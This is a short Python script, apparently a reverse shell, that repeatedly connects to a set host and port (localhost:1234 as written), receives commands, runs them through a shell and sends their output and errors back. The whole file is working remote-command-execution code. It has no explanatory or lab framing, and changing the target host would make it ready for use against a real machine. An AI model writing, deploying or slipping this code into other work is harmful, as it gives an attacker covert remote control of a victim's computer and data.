import socket, subprocess, os
import dis

target_host = "127.0.0.1"
target_port = 1234

while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_host,target_port))
    except:
        pass
    while True:
        try:
            data = client.recv(1024)
            if len(data) == 0:
                break
            cmd = data.decode("utf-8")
            cmd = cmd[:-1] # remove newline
            if cmd[:2] == 'cd':
                os.chdir(cmd[3:])
            if cmd == "exit":
                break
            if len(data) > 0:
                console = subprocess.Popen(cmd, shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE)
                output_bytes = console.stdout.read()
                error_bytes = console.stderr.read()
                output_bytes_decoded = output_bytes.decode("utf-8", "ignore")
                error_bytes_decoded = error_bytes.decode("utf-8", "ignore")
                client.send(str.encode(output_bytes_decoded))
                client.send(str.encode(error_bytes_decoded))
        except:
            break
    client.close()